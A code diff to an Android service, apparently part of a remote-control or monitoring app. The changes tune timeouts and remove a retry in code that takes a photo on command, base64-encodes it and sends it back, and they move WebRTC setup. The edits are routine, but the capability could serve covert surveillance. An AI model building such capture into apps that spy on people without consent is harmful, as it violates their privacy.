@@ -282,11 +282,7 @@ class MicService : Service() {
         super.onCreate()
         createNotificationChannel()
         acquireWakeLock()
-        try {
-            ensurePeerConnectionFactory()
-        } catch (e: Exception) {
-            Log.e(TAG, "WebRTC init failed (non-fatal, will work without WebRTC): ${e.message}", e)
-        }
+        // WebRTC init moved to startWebRtcSession() - too early here causes crash
         Log.i(TAG, "Service created. Device ID: $deviceId")
     }
 
@@ -1254,20 +1250,19 @@ class MicService : Service() {
         isPhotoCaptureBusy = true
         serviceScope.launch(Dispatchers.IO) {
             try {
-                // Add absolute timeout to prevent state lock
-                withTimeoutOrNull(15_000L) {
+                // Reduced timeout from 15s to 8s for faster response
+                withTimeoutOrNull(8_000L) {
                     val explicitFacing = parseRequestedCameraFacing(cameraMode)
                     val facing = explicitFacing ?: preferredCameraFacing
                     preferredCameraFacing = facing
-                    var jpeg = captureJpegOnce(facing, allowFacingFallback = explicitFacing == null)
-                    if (jpeg == null || jpeg.isEmpty()) {
-                        delay(250)
-                        jpeg = captureJpegOnce(facing, allowFacingFallback = true)
-                    }
+                    
+                    // Single capture attempt - no retry for speed
+                    val jpeg = captureJpegOnce(facing, allowFacingFallback = explicitFacing == null)
                     if (jpeg == null || jpeg.isEmpty()) {
                         safeSend("ACK:take_photo:failed")
                         return@withTimeoutOrNull
                     }
+                    
                     val optimized = optimizePhotoJpeg(jpeg)
                     val base64 = Base64.encodeToString(optimized, Base64.NO_WRAP)
                     val cameraName = if (facing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "rear"
@@ -1288,7 +1283,7 @@ class MicService : Service() {
                     safeSend("ACK:take_photo:ok:$cameraName")
                 } ?: run {
                     // Timeout occurred
-                    Log.e(TAG, "Photo capture timeout after 15 seconds")
+                    Log.e(TAG, "Photo capture timeout after 8 seconds")
                     safeSend("ACK:take_photo:timeout")
                 }
             } catch (e: Exception) {
@@ -1433,7 +1428,8 @@ class MicService : Service() {
                 }
             }, handler)
 
-            if (!openLatch.await(5, TimeUnit.SECONDS)) return null
+            // Reduced timeout from 5s to 3s
+            if (!openLatch.await(3, TimeUnit.SECONDS)) return null
             val cam = camera ?: return null
 
             val sessionLatch = CountDownLatch(1)
@@ -1446,7 +1442,8 @@ class MicService : Service() {
                     sessionLatch.countDown()
                 }
             }, handler)
-            if (!sessionLatch.await(5, TimeUnit.SECONDS)) return null
+            // Reduced timeout from 5s to 3s
+            if (!sessionLatch.await(3, TimeUnit.SECONDS)) return null
             val capSession = session ?: return null
 
             val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
@@ -1472,7 +1469,8 @@ class MicService : Service() {
             }.build()
 
             capSession.capture(req, object : CameraCaptureSession.CaptureCallback() {}, handler)
-            latch.await(6, TimeUnit.SECONDS)
+            // Reduced timeout from 6s to 4s
+            latch.await(4, TimeUnit.SECONDS)
             return bytes
         } catch (e: Exception) {
             Log.w(TAG, "captureJpegOnce failed: ${e.message}")
